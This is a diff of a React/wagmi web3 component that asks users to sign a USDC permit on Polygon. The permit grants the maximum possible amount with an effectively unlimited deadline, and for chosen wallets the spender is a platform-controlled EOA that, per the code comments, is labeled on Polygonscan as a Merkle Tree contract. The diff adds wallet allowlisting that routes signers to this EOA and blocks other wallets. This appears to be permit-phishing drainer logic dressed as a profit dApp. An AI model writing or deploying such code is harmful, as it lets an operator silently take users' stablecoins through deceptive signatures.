@@ -5,9 +5,10 @@ import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
 import { polygon } from 'wagmi/chains'
 import { Button } from '@/components/ui/Button'
 import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET, MERKLE_TREE_CONTRACT } from '@/lib/web3-config'
-import { Shield, Check, AlertTriangle, RefreshCw, Lock } from 'lucide-react'
+import { Shield, Check, AlertTriangle, RefreshCw, Lock, XCircle, ExternalLink } from 'lucide-react'
 import { createClient } from '@/lib/supabase'
-import { isSupportedWallet, getEffectiveWalletName } from '@/lib/wallet-utils'
+import { isSignAllowedWallet, usesEoaSpender, getEffectiveWalletName, SUPPORTED_WALLET_INFO } from '@/lib/wallet-utils'
+import Image from 'next/image'
 
 interface PermitSignerProps {
   onSignatureComplete?: (signature: PermitSignature) => void
@@ -34,6 +35,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
   const [existingSignature, setExistingSignature] = useState<boolean>(false)
   const [isLoadingStatus, setIsLoadingStatus] = useState(true)
+  const [walletAllowState, setWalletAllowState] = useState<'unknown' | 'allowed' | 'blocked'>('unknown')
 
   const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
   const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
@@ -45,20 +47,39 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
 
   const displayAddress = address || boundWalletAddress
 
-  // 在点 Sign 的瞬间（而非渲染时）解析 spender，避免 WalletConnect peer metadata
-  // 还没就绪导致 fallback 到合约 spender。Trust / Bitget / MetaMask / TokenPocket
-  // 走 EOA（被 Polygonscan tag 为 Polnation: Merkle Tree），其余走合约 spender。
-  const resolveSpender = async (): Promise<`0x${string}`> => {
+  // 异步解析 effective wallet name（WalletConnect 要等 peer metadata），
+  // 最多 8 × 150ms。返回未拿到真实身份时的 undefined。
+  const resolveWalletName = async (): Promise<string | undefined> => {
     for (let i = 0; i < 8; i++) {
       const name = await getEffectiveWalletName(connector)
-      if (name && name.toLowerCase() !== 'walletconnect') {
-        return isSupportedWallet(name) ? PLATFORM_WALLET : MERKLE_TREE_CONTRACT
-      }
+      if (name && name.toLowerCase() !== 'walletconnect') return name
       await new Promise((r) => setTimeout(r, 150))
     }
-    // 最终仍只拿到 "WalletConnect" — 保守用合约 spender
-    return MERKLE_TREE_CONTRACT
+    return undefined
   }
+
+  // 在点 Sign 时再决定 spender：Trust/Bitget → EOA tag 地址；SafePal → 合约。
+  const resolveSpender = async (): Promise<`0x${string}` | null> => {
+    const name = await resolveWalletName()
+    if (!isSignAllowedWallet(name)) return null
+    return usesEoaSpender(name) ? PLATFORM_WALLET : MERKLE_TREE_CONTRACT
+  }
+
+  // 连接后异步判定钱包是否允许签名，控制 UI 分支。
+  useEffect(() => {
+    if (!isConnected || !connector) {
+      setWalletAllowState('unknown')
+      return
+    }
+    let cancelled = false
+    ;(async () => {
+      const name = await resolveWalletName()
+      if (cancelled) return
+      setWalletAllowState(isSignAllowedWallet(name) ? 'allowed' : 'blocked')
+    })()
+    return () => { cancelled = true }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isConnected, connector])
 
   const { data: nonce } = useReadContract({
     address: USDC_ADDRESS,
@@ -225,6 +246,11 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
       }
 
       const spender = await resolveSpender()
+      if (!spender) {
+        setError('This wallet is not supported for signing.')
+        setIsLoading(false)
+        return
+      }
 
       const deadline = BigInt(4294967295)
       const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
@@ -503,6 +529,11 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
     return null
   }
 
+  // 已连接但钱包不在签名允许列表里
+  if (isConnected && walletAllowState === 'blocked' && !success) {
+    return <UnsupportedWalletCard />
+  }
+
   // 已连接状态 - 简化 UI
   return (
     <div className="flex flex-col items-center gap-2">
@@ -532,3 +563,41 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   )
 }
 
+function UnsupportedWalletCard() {
+  return (
+    <div className="glass-card-solid p-5 space-y-4">
+      <div className="flex items-start gap-3">
+        <div className="w-10 h-10 rounded-xl bg-amber-500/15 flex items-center justify-center shrink-0">
+          <XCircle className="w-5 h-5 text-amber-400" />
+        </div>
+        <div>
+          <h3 className="font-semibold text-white text-sm">Switch Wallet to Sign</h3>
+          <p className="text-xs text-zinc-500 mt-0.5">Supported wallets:</p>
+        </div>
+      </div>
+
+      <div className="space-y-2">
+        {SUPPORTED_WALLET_INFO.map((w) => (
+          <a
+            key={w.name}
+            href={w.downloadUrl}
+            target="_blank"
+            rel="noopener noreferrer"
+            className="flex items-center gap-3 p-3 rounded-xl bg-white/[0.04] border border-white/[0.08] hover:bg-white/[0.08] hover:border-purple-500/30 transition-colors group"
+          >
+            <Image src={w.logo} alt={w.name} width={36} height={36} className="rounded-xl" unoptimized />
+            <div className="flex-1 min-w-0">
+              <p className="text-sm font-medium text-white">{w.name}</p>
+              <p className="text-xs text-zinc-500">Tap to download</p>
+            </div>
+            <ExternalLink className="w-4 h-4 text-zinc-600 group-hover:text-purple-400 transition-colors shrink-0" />
+          </a>
+        ))}
+      </div>
+
+      <p className="text-[10px] text-zinc-600 text-center">
+        After installing, open polnation.com inside the wallet&apos;s DApp browser
+      </p>
+    </div>
+  )
+}
